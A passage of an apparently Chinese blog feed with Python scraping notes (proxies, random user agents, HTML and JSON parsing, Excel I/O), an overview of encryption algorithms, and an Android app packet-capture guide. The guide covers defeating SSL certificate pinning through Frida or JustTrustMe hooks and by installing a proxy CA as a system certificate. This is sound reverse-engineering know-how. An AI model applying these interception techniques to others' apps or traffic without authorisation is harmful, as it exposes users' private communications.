class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">  <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://10.10.1.10:3128&quot;</span>,</span><br><span class="line">  <span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://10.10.1.10:1080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.get(<span class="string">&quot;http://example.org&quot;</span>, proxies=proxies)</span><br></pre></td></tr></table></figure><p>socks5代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;socks5://user:pass@host:port&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;socks5://user:pass@host:port&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fake-useragent"><a href="#fake-useragent" class="headerlink" title="fake-useragent"></a>fake-useragent</h2><p>随机获取user_agent</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line">ua = UserAgent()</span><br><span class="line"><span class="comment">#随机获取一个ie浏览器ua</span></span><br><span class="line"><span class="built_in">print</span>(ua.ie <span class="keyword">or</span> ua.firefox <span class="keyword">or</span> ua.chrome)</span><br></pre></td></tr></table></figure><h2 id="Beautiful-soup"><a href="#Beautiful-soup" class="headerlink" title="Beautiful soup"></a>Beautiful soup</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;./content.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) </span><br><span class="line">html = file.read() </span><br><span class="line">bs = BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>) <span class="comment"># 缩进格式</span></span><br><span class="line"><span class="comment"># print(bs.prettify()) # 格式化html结构</span></span><br><span class="line"><span class="comment"># print(bs.title) # 获取title标签的名称</span></span><br><span class="line"><span class="comment"># print(bs.title.name) # 获取title的name</span></span><br><span class="line"><span class="comment"># print(bs.title.string) # 获取head标签的所有内容</span></span><br><span class="line"><span class="comment"># print(bs.head) </span></span><br><span class="line"><span class="comment"># print(bs.div.a)  # 获取第一个div标签中的所有内容</span></span><br><span class="line"><span class="comment"># print(bs.div[&quot;id&quot;]) # 获取第一个div标签的id的值</span></span><br><span class="line"><span class="comment"># print(bs.a) </span></span><br><span class="line"><span class="comment"># print(bs.find_all(&quot;a&quot;)) # 获取所有的a标签</span></span><br><span class="line"><span class="comment"># print(bs.find(id=&quot;u1&quot;)) # 获取id=&quot;u1&quot;</span></span><br><span class="line"><span class="comment"># for item in bs.find_all(&quot;a&quot;): </span></span><br><span class="line"><span class="comment">#     print(item.get(&quot;href&quot;)) # 获取所有的a标签，并遍历打印a标签中的href的值</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> bs.find_all(<span class="string">&quot;a&quot;</span>): </span><br><span class="line">    <span class="built_in">print</span>(item.get_text())</span><br></pre></td></tr></table></figure><h2 id="lxml"><a href="#lxml" class="headerlink" title="lxml"></a>lxml</h2><p>lxml 是 Python 的第三方解析库，完全使用 Python 语言编写，它对 Xpath 表达式提供了良好的支持，因此能够了高效地解析 HTML/XML 文档。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install lxml    <span class="comment">#安装模块</span></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree <span class="comment">#导入模块</span></span><br></pre></td></tr></table></figure><p><strong>提取所有a标签内的文本信息</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://news.sina.com.cn/&quot;</span></span><br><span class="line"></span><br><span class="line">c = requests.get(url)</span><br><span class="line">doc = c.content.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">parse_html=etree.HTML(doc)</span><br><span class="line">xpath_bds=<span class="string">&#x27;//*[@id=&quot;blk_gnxw_011&quot;]/li/a/text()\n&#x27;</span></span><br><span class="line"><span class="comment"># xpath_bds=&#x27;//*[@id=&quot;blk_gnxw_011&quot;]/li/a/@href&#x27;   #获取A标签 href的属性值</span></span><br><span class="line"></span><br><span class="line">r_list=parse_html.xpath(xpath_bds)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r_list)</span><br><span class="line"><span class="built_in">print</span>(r_list[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h2 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h2><p>Python urllib 库用于操作网页 URL，并对网页的内容进行抓取处理,默认url不进行编码,requests库默认会对url进行编码,编写工具时需要用这个库.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urllib.request - 打开和读取 URL。</span><br><span class="line">urllib.error - 包含 urllib.request 抛出的异常。</span><br><span class="line">urllib.parse - 解析 URL。</span><br><span class="line">urllib.robotparser - 解析 robots.txt 文件。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">string = <span class="string">&#x27;%E7%88%AC%E8%99%AB&#x27;</span>     </span><br><span class="line">string1 = &#123;<span class="string">&quot;wd&quot;</span>:<span class="string">&#x27;爬虫&#x27;</span>&#125;           <span class="comment"># 这里参数必须是字典</span></span><br><span class="line">result = parse.unquote(string)   <span class="comment">#url解码</span></span><br><span class="line">result1 = parse.urlencode(string1)  <span class="comment">#url编码</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(result1)</span><br></pre></td></tr></table></figure><h2 id="openpyxl"><a href="#openpyxl" class="headerlink" title="openpyxl"></a>openpyxl</h2><p><strong>引入库</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook</span><br></pre></td></tr></table></figure><p><strong>基本操作</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wb1 = Workbook(encoding=<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">wb = Workbook()  </span><br><span class="line">wb = load_workbook(<span class="string">&#x27;./000.xlsx&#x27;</span>)   <span class="comment">#加载一个文件.</span></span><br><span class="line">ws1 = wb.create_sheet(<span class="string">&#x27;111&#x27;</span>)       <span class="comment">#设置工作表名</span></span><br></pre></td></tr></table></figure><p><strong>写入数据</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">table[<span class="string">&#x27;A2&#x27;</span>] = <span class="number">4</span>     <span class="comment">#单元格写入</span></span><br><span class="line">table[<span class="string">&#x27;A1&#x27;</span>] = <span class="string">&#x27;=SUM(1,1)&#x27;</span>    <span class="comment">#按公式写入</span></span><br><span class="line"></span><br><span class="line">table.cell(row = <span class="number">3</span>,column = <span class="number">1</span>,value = <span class="number">10</span>)      <span class="comment">#按行列写入</span></span><br><span class="line">table.cell(row = <span class="number">3</span>,column = <span class="number">1</span>).value = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">row = [<span class="string">&quot;a&quot;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,]<span class="comment">#写入一行</span></span><br><span class="line">sheet.append(row)                    </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> openpyxl <span class="comment">#写入</span></span><br><span class="line"><span class="comment">#这个库的行列索引是从1开始的</span></span><br><span class="line">writeBook_in = openpyxl.load_workbook(<span class="string">&#x27;追加.xlsx&#x27;</span>)</span><br><span class="line">writeSheet_in = writeBook_in[<span class="string">&quot;Sheet1&quot;</span>]</span><br><span class="line"></span><br><span class="line">writeRow_in = <span class="number">6</span><span class="comment">#从第6排开始</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):<span class="comment">#循环两次，所以到第7排</span></span><br><span class="line">    </span><br><span class="line">    writeSheet_in.cell(writeRow_in, <span class="number">2</span>, <span class="string">&#x27;李四&#x27;</span>) </span><br><span class="line">    writeSheet_in.cell(writeRow_in, <span class="number">3</span>, <span class="string">&#x27;女&#x27;</span>) </span><br><span class="line">    writeSheet_in.cell(writeRow_in, <span class="number">4</span>, <span class="string">&#x27;55566620121010123456&#x27;</span>) </span><br><span class="line">    writeSheet_in.cell(writeRow_in, <span class="number">6</span>, <span class="string">&#x27;1-101&#x27;</span>) </span><br><span class="line">    writeSheet_in.cell(writeRow_in, <span class="number">9</span>, <span class="number">15611112222</span>) </span><br><span class="line">    </span><br><span class="line">    writeRow_in += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">writeBook_in.save(<span class="string">&quot;追加第二版.xlsx&quot;</span>)<span class="comment">#在源文件当前目录新建一个文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>读取数据</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">f = openpyxl.load_workbook(<span class="string">&#x27;test.xlsx&#x27;</span>)  <span class="comment">#读取一个excel文件</span></span><br><span class="line"><span class="comment">#读取单元格或范围切片</span></span><br><span class="line">c = table[<span class="string">&#x27;A1&#x27;</span>]<span class="comment">#获取&#x27;A1&#x27;，返回class</span></span><br><span class="line">c = table.cell(row = <span class="number">1</span>,column = <span class="number">1</span>)<span class="comment">#按行列数获读取</span></span><br><span class="line"></span><br><span class="line">row5 = table[<span class="number">5</span>]     <span class="comment">#获取第5行，返回元组</span></span><br><span class="line">colA = table[<span class="string">&#x27;C&#x27;</span>]    <span class="comment">#获取C列</span></span><br><span class="line">cell_range = table[<span class="string">&#x27;A1&#x27;</span>:<span class="string">&#x27;B4&#x27;</span>]    <span class="comment">#获取范围切片元组</span></span><br><span class="line">row_range = table[<span class="number">5</span>:<span class="number">8</span>]<span class="comment">#5到8行</span></span><br><span class="line">col_range[<span class="string">&#x27;A:D&#x27;</span>]<span class="comment">#A到D列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#按行列数读取范围切片</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> table.iter_rows(min_row=<span class="number">1</span>, max_col=<span class="number">3</span>, max_row=<span class="number">2</span>):    <span class="comment">#按行读取</span></span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> table.iter_cols(min_row=<span class="number">1</span>, max_col=<span class="number">3</span>, max_row=<span class="number">2</span>):    <span class="comment">#按列读取</span></span><br><span class="line"></span><br><span class="line">table.max_row    <span class="comment">#最大行数</span></span><br><span class="line">table.max_column <span class="comment">#最大列数</span></span><br><span class="line">table.rows     <span class="comment">#按行遍历</span></span><br><span class="line">table.columns    <span class="comment">#按列遍历</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#读取单元格的值</span></span><br><span class="line">c = table[<span class="string">&#x27;A2&#x27;</span>].value<span class="comment">#按位置读取</span></span><br><span class="line">c = table.cell(row = <span class="number">1</span>,column = <span class="number">1</span>).value<span class="comment">#按行列数读取 </span></span><br></pre></td></tr></table></figure><p><strong>保存</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wb.save(<span class="string">&#x27;sanguo.xlsx&#x27;</span>)  <span class="comment"># 保存文件，注意以xlsx为文件扩展名</span></span><br></pre></td></tr></table></figure><h2 id="系统模块-json"><a href="#系统模块-json" class="headerlink" title="系统模块 json"></a>系统模块 json</h2><p>用于json的解析后在使用jsonpath取提取</p><table><thead><tr><th>函数名</th><th>说明</th></tr></thead><tbody><tr><td>json.dumps()</td><td>将 Python 对象转换成 JSON 字符串。</td></tr><tr><td>json.loads()</td><td>将 JSON 字符串转换成 Python 对象。<strong>引入字符串</strong></td></tr><tr><td>json.dump()</td><td>将 Python 中的对象转化成 JSON 字符串储存到文件中。</td></tr><tr><td>json.load()</td><td>将文件中的 JSON 字符串转化成 Python 对象提取出来。 <strong>加载文件</strong></td></tr></tbody></table><h2 id="JsonPath"><a href="#JsonPath" class="headerlink" title="JsonPath"></a>JsonPath</h2><p>使用例子:必须导入两个库, json,jsonpath,先用json.loads(字符串)转换,再用jsonpath().</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pip install jsonpath</span><br><span class="line">pip install json</span><br><span class="line"></span><br><span class="line">response = requests.get(url,headers=headers)<span class="comment">#requests请求JSON内容</span></span><br><span class="line">html = response.text</span><br><span class="line">data = json.loads(html)    <span class="comment">#json.loads把json数据转换成python字典</span></span><br><span class="line"><span class="comment"># 使用 jsonpath 提取数据</span></span><br><span class="line">rjson = jsonpath.jsonpath(data,<span class="string">&#x27;$.data[*].cover&#x27;</span>) <span class="comment">#jsonpath 语句提取</span></span><br><span class="line"><span class="built_in">print</span>(rjson)</span><br></pre></td></tr></table></figure><p>JsonPath语法要点：</p><ul><li><code>$</code> 表示文档的根元素</li><li><code>@</code> 表示文档的当前元素</li><li><code>.node_name</code> 或 <code>[&#39;node_name&#39;]</code> 匹配下级节点</li><li><code>[index]</code> 检索数组中的元素</li><li><code>[start:end:step]</code> 支持数组切片语法</li><li><code>*</code> 作为通配符，匹配所有成员</li><li><code>..</code> 子递归通配符，匹配成员的所有子元素</li><li><code>(&lt;expr&gt;)</code> 使用表达式</li><li><code>?(&lt;boolean expr&gt;)</code>进行数据筛选</li></ul><p>在线语法解析器:<a href="https://www.ivtool.com/jsonpath-parser/">https://www.ivtool.com/jsonpath-parser/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;requests&quot;&gt;&lt;a href=&quot;#requests&quot; class=&quot;headerlink&quot; title=&quot;requests&quot;&gt;&lt;/a&gt;requests&lt;/h2&gt;&lt;p&gt;默认会对url进行编码.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;get请求&lt;/strong&gt;&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="编程" scheme="https://bstark.me/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>加密算法基础</title>
    <link href="https://bstark.me/posts/43153/"/>
    <id>https://bstark.me/posts/43153/</id>
    <published>2022-02-08T12:54:52.000Z</published>
    <updated>2022-04-01T06:55:27.022Z</updated>
    
    <content type="html"><![CDATA[<h2 id="补充中"><a href="#补充中" class="headerlink" title="补充中~~"></a>补充中~~</h2><h4 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法:"></a>对称加密算法:</h4><p>加密和解密都使用同一把秘钥，这种加密方法称为对称加密，也称为单密钥加密。<br>简单理解为：加密解密都是同一把钥匙。</p><p><strong>DES:</strong></p><p><strong>DES</strong>是对称性加密里面常见一种，全称为Data Encryption Standard，即数据加密标准，是一种使用密钥加密的块算法。密钥长度是64位(bit)，超过位数密钥被忽略。所谓对称性加密，加密和解密密钥相同。对称性加密一般会按照固定长度，把待加密字符串分成块。不足一整块或者刚好最后有特殊填充字符。往往跨语言做DES加密解密，经常会出现问题。往往是填充方式不对、或者编码不一致、或者选择加密解密模式(ECB,CBC,CTR,OFB,CFB,NCFB,NOFB)没有对应上造成。常见的填充模式有： ‘pkcs5’,’pkcs7’,’iso10126’,’ansix923’,’zero’ 类型，包括DES-ECB,DES-CBC,DES-CTR,DES-OFB,DES-CFB。</p><p><strong>AES:</strong></p><p>AES加密过程涉及到4种操作：字节替代（SubBytes）、行移位（ShiftRows）、列混淆（MixColumns）和轮密钥加（AddRoundKey）。解密过程分别为对应的逆操作。由于每一步操作都是可逆的，按照相反的顺序进行解密即可恢复明文。加解密中每轮的密钥分别由初始密钥扩展得到。算法中16（byte）字节的明文、密文和轮密钥都以一个4x4的矩阵表示。AES的密码必须是16byte。如果文件大小不是16字节的整数倍，那就要在末尾添加一些数据凑够。每个块都会被单独去进行加密。</p><h4 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法:"></a>非对称加密算法:</h4><p>与对称加密算法不同，非对称加密算法需要两个密钥：公钥（publickey）和私钥（privatekey）。公钥<br>与私钥是一对，如果用公钥对数据进行加密，只有用对应的私钥才能解密；如果用私钥对数据进行加密，那么只有用对应的公钥才能解密。因为加密和解密使用的是两个不同的密钥，所以这种算法叫作非对称加密算法。<br>简单理解为：加密和解密是不同的钥匙。<br>常见算法：<strong>RSA</strong>、Elgamal、背包算法、Rabin、D-H、ECC（椭圆曲线加密算法）等</p><p><strong>RSA</strong>:</p><ul><li>加密场景，那么肯定希望只有我才能解密，别人只能加密。即<strong>公钥加密，私钥解密。</strong></li><li>签名场景，既然是签名，就希望只能我才能签名，别人只能验证。即<strong>私钥签名，公钥验签</strong></li></ul><h4 id="信息摘要算法"><a href="#信息摘要算法" class="headerlink" title="信息摘要算法:"></a>信息摘要算法:</h4><p>消息摘要算法也被称为哈希（Hash）算法或散列算法。任何消息经过散列函数处理后，都会获得唯一的散列值，这一过程称为 “消息摘要”，其散列值称为 “数字指纹”，其算法自然就是 “消息摘要算法”了,它是一个唯一对应一个消息或文本的固定长度的值，它由一个单向Hash加密函数对消息进行作用而产生。</p><p>常见的算法有<strong>MD5</strong>、<strong>SHA</strong> 和 <strong>MAC</strong>、<strong>CRC</strong> 等</p><h4 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名:"></a>数字签名:</h4><p>数字签名（又称公钥数字签名、电子签章）是一种类似写在纸上的普通的物理签名，但是使用了公钥加密领域的技术实现，用于鉴别数字信息的方法。一套数字签名通常定义两种互补的运算，一个用于签名，另一个用于验证。<br>数字签名，就是只有信息的发送者才能产生的别人无法伪造的一段数字串，这段数字串同时也是对信息的发送者发送信息真实性的一个有效证明。<br>数字签名，就是对要发送的消息的消息摘要（md5 sha）使用私钥加密后的字符串。<br>数字签名是非对称密钥加密技术与数字摘要技术的综合应用。</p><h4 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书:"></a>数字证书:</h4><p>数字证书就是互联网通讯中标志通讯各方身份信息的一串数字，提供了一种在Internet上验证通信实体身份的方式，它是由权威机构——CA机构，又称为证书授权（Certificate Authority）中心发行的，人们可以在网上用它来识别对方的身份。</p><p><strong>HTTPS(ssl):</strong></p><p>SSL(Secure Sockets Layer 安全套接层)，用以保障在 Internet 上数据传输之安全，利用数据加密(Encryption)技术，可确保数据在网络上之传输过程中不会被截取及窃听。</p><p>TLS（Transport Layer Security 传输层安全），用于在两个通信应用程序之间提供保密性和数据完整性。TLS 是 SSL 的标准化后的产物，有 1.0 ，1.1 ，1.2 三个版本，默认使用 1.0。TLS1.0 和 SSL3.0 几乎没有区别 ，事实上我们现在用的都是 TLS，但因为历史上习惯了 SSL 这个称呼。</p><p>参考:</p><p><a href="https://program-think.blogspot.com/2014/11/https-ssl-tls-2.html">https://program-think.blogspot.com/2014/11/https-ssl-tls-2.html</a></p><p><a href="https://www.kancloud.cn/alex_wsc/java_security/464047">https://www.kancloud.cn/alex_wsc/java_security/464047</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;补充中&quot;&gt;&lt;a href=&quot;#补充中&quot; class=&quot;headerlink&quot; title=&quot;补充中~~&quot;&gt;&lt;/a&gt;补充中~~&lt;/h2&gt;&lt;h4 id=&quot;对称加密算法&quot;&gt;&lt;a href=&quot;#对称加密算法&quot; class=&quot;headerlink&quot; title=&quot;对称加密算</summary>
      
    
    
    
    
    <category term="算法" scheme="https://bstark.me/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>APP抓包解决方案,没有抓不到的包</title>
    <link href="https://bstark.me/posts/51245/"/>
    <id>https://bstark.me/posts/51245/</id>
    <published>2022-02-08T07:01:34.000Z</published>
    <updated>2022-04-01T06:29:12.220Z</updated>
    
    <content type="html"><![CDATA[<p>编辑中…</p><h2 id="手机抓包"><a href="#手机抓包" class="headerlink" title="手机抓包"></a>手机抓包</h2><p>  优点: 无法对抗,全部能抓,没有抓不到的包.</p><ul><li>手机上抓:Nethunter  可视化抓包.</li></ul><p>​     ①优点:直观,所见即所得</p><p>​     ②缺点:没有内容,粒度太粗,简单看下</p><ul><li>手机上抓:Wireshark  抓包转存.</li></ul><p>​     ①优点:可以转储内容,存下来稍后分析.</p><p>​     ②只能看明文,不能发解加密协议.</p><ul><li>手机上抓:tcpdump  抓包转存.</li></ul><p>​     ①优点:不需要刷Nethunter.</p><p>​     ②缺点:没有界面</p><ul><li><p>电脑+手机:hook  Socket  抓包.</p></li><li><p>电脑+手机:Frida Hook  模拟抓包,改包,重放.</p></li><li><p>电脑+手机:Charles  协议层抓包</p></li></ul><h2 id="hook抓包"><a href="#hook抓包" class="headerlink" title="hook抓包"></a>hook抓包</h2><p>  ①优点:为所欲为,可以对包的内容进行进一步的更改和定制.</p><p>  ②优点:抓包全面,直接就是明文,不需要协议(无需绕过证书绑定)</p><p>  ③缺点:可能会不全,可能会漏.hook点是有限的.万一它在用其它的框架做网络传输就会漏掉.</p><p>工具:okhttplogger-frida</p><h2 id="协议层抓包"><a href="#协议层抓包" class="headerlink" title="协议层抓包"></a>协议层抓包</h2><p>  <strong>Charles + Postern</strong> </p><p>①优点:全面.已经解好了协议,HTTP,WebSocket直接解好.</p><p>②缺点:配置证书稍微麻烦,解不了纯Socket.</p><h2 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h2><p>略………………….</p><h2 id="强制手机所有的流量走vpn-路由"><a href="#强制手机所有的流量走vpn-路由" class="headerlink" title="强制手机所有的流量走vpn(路由)"></a>强制手机所有的流量走vpn(路由)</h2><p>撰写中……………….</p><h2 id="抓不到包的解决方案"><a href="#抓不到包的解决方案" class="headerlink" title="抓不到包的解决方案"></a>抓不到包的解决方案</h2><h4 id="APP不走代理"><a href="#APP不走代理" class="headerlink" title="APP不走代理"></a>APP不走代理</h4><p>打开抓包软件，抓不到包，但APP能正常访问；关闭抓包软件后 APP仍然能正常访</p><p><strong>解决</strong></p><p>ProxyDroid APP 全局代理 强制把IP转发到代理端口上</p><h4 id="APP有做ssl证书校验"><a href="#APP有做ssl证书校验" class="headerlink" title="APP有做ssl证书校验"></a>APP有做ssl证书校验</h4><p>打开抓包软件后 APP不能访问</p><p><strong>解决</strong></p><p>使用justtrustme等Hook 校验代码 让APP 信任代理证书或不做证书校验</p><h4 id="APP有做双向证书校验"><a href="#APP有做双向证书校验" class="headerlink" title="APP有做双向证书校验"></a>APP有做双向证书校验</h4><p>打开抓包软件后 APP不能访问，但抓包软件上会有服务端返回的错误</p><p><strong>解决</strong></p><p>抠出APP里的SSL证书，导入抓包软件中</p><h4 id="APP网络请求混淆"><a href="#APP网络请求混淆" class="headerlink" title="APP网络请求混淆"></a>APP网络请求混淆</h4><p>网络请求库代码有混淆（okhttp HttpURLConnection等等有混淆）打开抓包软件后 APP不能访问</p><p><strong>解决</strong></p><p>方1.使用升级版JustMePlus 自适配Hook混淆后的网络请求库代码（自适配okhttp）</p><p>方2.使用ssl_logger Hook 系统ssl_read ssl_write函数，在手机上抓包，无需配置代理 和安装证书。</p><h4 id="APP走TCP协议"><a href="#APP走TCP协议" class="headerlink" title="APP走TCP协议"></a>APP走TCP协议</h4><p>APP不是发的应用层http协议，使用socket走的是网络层tcp,跟不走代理现象相似，配置好代理后，打开或关闭抓包软件，APP都能正常访问，抓包软件也抓不到包。</p><p><strong>解决</strong></p><p>tcpdump或wireshark抓包 抓tcp包 找线索Hook APP代码 抓到发包和解包的代码处</p><p>发送的数据通常是私有协议，需要逆向解密</p><h4 id="返回数据加密"><a href="#返回数据加密" class="headerlink" title="返回数据加密"></a>返回数据加密</h4><p>能抓到包，但返回数据是乱码,或加密字符串.</p><p><strong>解决:</strong> 找线索Hook APP 找到加解密的代码处</p><p><strong>案例:</strong></p><h2 id="工具的配合用法"><a href="#工具的配合用法" class="headerlink" title="工具的配合用法"></a>工具的配合用法</h2><p>先用Httpcanary抓包，找到该APP发送TCP的IP地址</p><p>再用tcpdump重新在手机上抓包，拷贝到本地电脑上来</p><p>使用wireshark打开该数据包，过滤出目标IP的数据包</p><p>通过抓包tcp包里的可见字符作为线索，反向定位代码，实现Tcp 的Hook抓取</p><h2 id="证书锁定"><a href="#证书锁定" class="headerlink" title="证书锁定"></a>证书锁定</h2><p>客户端关于证书处理的逻辑如下分类:</p><table><thead><tr><th>等级</th><th>策略</th><th>信任范围</th><th>破解方法</th></tr></thead><tbody><tr><td>0</td><td>完全兼容策略</td><td>信任所有证书包括自签发证书</td><td>无需特殊操作</td></tr><tr><td>1</td><td>系统/浏览器默认策略</td><td>信任系统或浏览内置CA证书以及用户安装证书</td><td>设备安装代理证书</td></tr><tr><td>2</td><td>system CA pinning</td><td>只信任系统根证书,不信任用户安装的证书 (android 7.0支持配置network-security-config)</td><td>注入或者root后将用户证书拷贝到系统证书目录</td></tr><tr><td>3</td><td>CA Pinning Root (intermediate) certificate pinning</td><td>信任指定CA颁发的证书</td><td>hook注入等方式篡改锁定逻辑</td></tr><tr><td>4</td><td>Leaf Certificate pinning</td><td>信任指定站点证书</td><td>hook注入等方式篡改锁定逻辑 如遇双向锁定需将app自带证书导入代理软件</td></tr></tbody></table><p><strong>system CA pinning 抓包</strong></p><p>只信任系统根证书,不信任用户安装的证书,我们可以注入或者root后将用户证书拷贝到系统证书目录,下面将的是把用户证书拷贝到系统证书目录的安装方法</p><p>1.导出抓包软件pem证书 *.如果导出cer证书要转换证书为pem格式<br>.pem证书转.cer证书 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -outform der -in demo.pem -out demo.cer </span><br></pre></td></tr></table></figure><p>.cer证书转.pem证书 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform der -in demo.cer -out demo.pem</span><br></pre></td></tr></table></figure><p>将 der 格式的证书转为 pem 证书</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform der -in cacert.der -out burp.pem </span><br></pre></td></tr></table></figure><p>2.输出证书内容</p><figure class="highlight plaintext"><table><tr><td 